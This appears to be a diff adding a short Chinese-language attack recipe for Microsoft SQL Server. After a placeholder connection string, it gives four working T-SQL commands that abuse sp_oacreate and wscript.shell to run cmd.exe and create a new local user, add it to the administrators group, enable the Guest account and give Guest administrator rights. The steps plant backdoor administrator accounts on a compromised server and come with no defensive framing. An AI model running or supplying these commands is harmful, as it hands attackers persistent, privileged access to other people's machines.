@@ -1,0 +1,20 @@
+
+1、连接数据库
+
+driver={SQL Server};server=服务器IP;uid=用户名;pwd=密码;database=数据库名
+
+2、添加新用户
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user 新用户 密码 /add'
+
+3、把用户加到管理组
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 新用户 /add'
+
+4、激活GUEST用户
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user guest /active:yes'
+
+5、把Guest加到管理组
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup Administrators Guest /add'
